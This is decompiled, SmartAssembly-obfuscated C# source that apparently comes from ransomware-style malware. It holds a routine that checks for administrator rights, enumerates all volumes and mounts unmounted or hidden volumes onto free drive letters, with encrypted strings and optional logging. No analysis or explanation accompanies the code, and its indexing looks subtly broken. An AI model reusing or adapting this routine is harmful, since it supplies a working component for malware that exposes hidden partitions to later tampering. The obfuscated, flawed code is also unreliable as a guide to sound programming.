using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jtAYXTgtXeY;

public static class rgDJXQtLGzyOSH
{
	public enum YWPLzTVQkGZQqm : uint
	{
		bWEhUIdfpCqAT,
		uQOjohKiLiZH,
		xwZbYNzSjfQ,
		ZKbZFGTmdOQ,
		nvEEcaqCtSGA,
		JwKYsTzCwNidLmBZh,
		DfbbPNcMdSkA
	}

	private sealed class CdZCoDTnWtJM
	{
		public uint lFmSYAGJAMZ;

		public uint BUTxJjFcEOIBsFqj;

		public char[] KfDpqScqzUfO;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, KfDpqScqzUfO, BUTxJjFcEOIBsFqj, ref lFmSYAGJAMZ))
			{
				return KfDpqScqzUfO.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern YWPLzTVQkGZQqm GetDriveType([MarshalAs(UnmanagedType.LPStr)] string RkiAqERhrRRj);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string gPYZZhpRmo, char[] VNfizHhGPGAlC, uint SlFXAQdARMhYJ, ref uint wBUWAozSPczMyl);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> QkNXrELOSgwtc()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void MmnLNNoyqKx()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			CdZCoDTnWtJM CS_0024_003C_003E8__locals0 = new CdZCoDTnWtJM();
			string[] array = new string[26]
			{
				getString_0(107396634),
				getString_0(107396092),
				getString_0(107396694),
				getString_0(107396629),
				getString_0(107396075),
				getString_0(107396082),
				getString_0(107396070),
				getString_0(107396642),
				getString_0(107396612),
				getString_0(107396639),
				getString_0(107396682),
				getString_0(107396624),
				getString_0(107396699),
				getString_0(107396689),
				getString_0(107396652),
				getString_0(107396647),
				getString_0(107396669),
				getString_0(107396664),
				getString_0(107396659),
				getString_0(107396045),
				getString_0(107396087),
				getString_0(107396672),
				getString_0(107396065),
				getString_0(107396677),
				getString_0(107396617),
				getString_0(107396622)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == YWPLzTVQkGZQqm.uQOjohKiLiZH)
				{
					array2[num++] = text;
				}
			}
			List<string> source = QkNXrELOSgwtc();
			CS_0024_003C_003E8__locals0.lFmSYAGJAMZ = 0u;
			CS_0024_003C_003E8__locals0.BUTxJjFcEOIBsFqj = 120u;
			CS_0024_003C_003E8__locals0.KfDpqScqzUfO = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.KfDpqScqzUfO, CS_0024_003C_003E8__locals0.BUTxJjFcEOIBsFqj, ref CS_0024_003C_003E8__locals0.lFmSYAGJAMZ) || CS_0024_003C_003E8__locals0.KfDpqScqzUfO.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (efoRmwagKuQD.vktNUmAHjywZJ)
				{
					try
					{
						Console.WriteLine(getString_0(107397427), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (efoRmwagKuQD.WkkVnLAdbtG)
			{
				try
				{
					File.AppendAllText(efoRmwagKuQD.PhOHjwgFpwoPkI, getString_0(107397402) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static rgDJXQtLGzyOSH()
	{
		Strings.CreateGetStringDelegate(typeof(rgDJXQtLGzyOSH));
	}
}
